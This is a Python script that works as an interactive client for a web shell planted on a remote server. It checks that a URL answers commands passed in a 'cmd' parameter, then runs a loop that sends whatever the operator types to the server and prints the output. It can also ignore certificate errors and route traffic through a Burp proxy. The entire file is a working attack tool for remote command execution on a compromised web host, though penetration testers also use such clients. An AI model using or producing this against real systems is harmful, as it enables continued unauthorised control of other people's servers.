import requests
from bs4 import BeautifulSoup
import argparse
from termcolor import colored
from tqdm import tqdm

parser = argparse.ArgumentParser(description='Interactive web shell client by al1z4deh (https://github.com/al1z4deh)')
parser.add_argument('url', help='Web shell URL')
parser.add_argument('-k', '--insecure', action='store_true', help='Ignore SSL certificate errors')
parser.add_argument('-b', '--burp', action='store_true', help='Use Burp Suite proxy')
args = parser.parse_args()

session = requests.Session()
if args.insecure:
    session.verify = False
if args.burp:
    session.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to check if URL is a web shell
def is_web_shell(url):
    try:
        response = session.get(url, params={'cmd': 'echo "test"'}).content.decode()
        if 'test' in response:
            return True
    except:
        pass
    return False

# Check if the URL is a web shell
if is_web_shell(args.url):
    print(colored(f"{args.url} is a web shell! 🐚", "green"))
else:
    print(colored(f"{args.url} is NOT a web shell. ⛔️", "red"))
    exit()

# Print header
print(colored("\nInteractive web shell client by al1z4deh (https://github.com/al1z4deh)", "blue", attrs=["bold", "underline"]))

# Try to connect to the web shell
print(colored("\n🔌 Connecting to web shell at", "blue"), colored(args.url, "cyan"))
with tqdm(total=10) as progress:
    for i in range(10):
        try:
            session.get(args.url, timeout=1)
        except requests.exceptions.RequestException:
            pass
        progress.update(1)

try:
    r = session.get(args.url)
    r.raise_for_status()
    print(colored("✅ Web shell connected successfully! 🔗", "green"))
except requests.exceptions.RequestException as e:
    print(colored("❌ Error connecting to web shell:", "red"), e)
    exit()

print("Enter 'exit' to exit the shell.")
while True:
    cmd = input(colored(">> ", "green"))
    if cmd == 'exit':
        break
    payload = {'cmd': cmd}
    try:
        print(f"Executing payload: {args.url}?cmd={cmd}")
        r = session.get(args.url, params=payload)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        pre = soup.find('pre')
        if pre:
            print(colored(pre.text, "green"))
        else:
            print(colored(r.text, "green"))
    except requests.exceptions.RequestException as e:
        print(colored("❌ Error executing command:", "red"), e)
        exit()

# Disconnect from the web shell
print(colored("\n🔌 Disconnecting from web shell...", "blue"))
try:
    session.get(args.url, params={'cmd': 'exit'})
    print(colored("✅ Web shell disconnected successfully! 🔌", "green"))
except requests.exceptions.RequestException as e:
    print(colored("❌ Error disconnecting from web shell:", "red"), e)
